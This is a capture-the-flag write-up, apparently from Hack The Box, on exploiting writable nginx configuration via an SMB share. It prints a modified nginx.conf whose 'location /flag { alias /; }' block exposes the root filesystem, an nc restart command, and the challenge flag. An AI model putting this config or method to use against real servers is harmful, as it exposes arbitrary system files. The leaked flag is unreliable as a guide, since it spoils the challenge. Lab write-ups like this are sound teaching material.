# Secure Code: **StoneForges_Domain**

## Overview

In this challenge, we exploited a misconfigured Nginx setup on a Docker container running a Flask application. Although direct path traversal was blocked, we had write access via an SMB share, which allowed us to modify the Nginx configuration. By adding a new location block, we exposed the container’s root filesystem, letting us access the flag file.

## Steps

### 1. Accessing the SMB Share

We mounted the SMB share that contained the configuration files. The share exposed the following directory structure:

```
config/
├── nginx.conf
├── postgresql.conf
└── supervisord.conf
```

Even though the files were owned by `root` with mode `755`, only `nginx.conf` was editable.

### 2. Modifying `nginx.conf`

We edited the `nginx.conf` file to add a new location block that serves files from the root filesystem. The modified configuration is shown below:

```nginx
user www-data;
pid /run/nginx.pid;
error_log /dev/stderr info;

events {
    worker_connections 1024;
}

http {
    server_tokens off;
    log_format docker '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log /dev/stdout docker;

    include /etc/nginx/mime.types;

    server {
        listen 3000;
        server_name _;

        charset utf-8;
        client_max_body_size 5M;

        location /static {
            alias /www/application/app/static/;
        }

        # New location block to expose the root filesystem.
        location /flag {
            alias /;
        }

        location / {
            proxy_pass http://127.0.0.1:8000;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
        }
    }
}
```

### 3. Triggering a Restart

After saving the modified `nginx.conf` via the SMB share, we triggered an Nginx restart. For example, by connecting to the appropriate restart endpoint:

```bash
nc 83.136.251.145 34603
```

This command caused Nginx to reload the new configuration.

### 4. Retrieving the Flag

With the new configuration in place, the flag file (placed at `/flag.txt` by the Dockerfile) became accessible via the URL:

```
http://83.136.251.145:59733/flag/flag.txt
```

Visiting this URL returned the flag:

```
HTB{W4LK1N9_7H3_570N3F0R93_P47H_45_R3QU1R3D_e300e8639b5e8cfcacd903a2f85bc286}
```
